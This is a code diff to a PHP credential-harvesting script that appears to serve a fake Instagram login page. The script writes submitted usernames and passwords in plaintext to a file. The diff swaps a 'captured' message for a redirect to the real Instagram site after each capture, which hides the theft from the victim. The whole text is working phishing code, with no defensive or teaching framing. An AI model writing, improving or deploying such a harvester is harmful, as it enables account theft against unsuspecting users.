@@ -4,7 +4,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $password = $_POST['password'];
     // Save credentials to a file
     file_put_contents('credentials.txt', "Username: $username\nPassword: $password\n", FILE_APPEND);
-    // Optionally, you can send the credentials to your email or process them further
-    echo "Credentials captured successfully!";
+    // Redirect to Instagram after capturing credentials
+    header("Location: https://www.instagram.com");
+    exit();
 }
 ?>
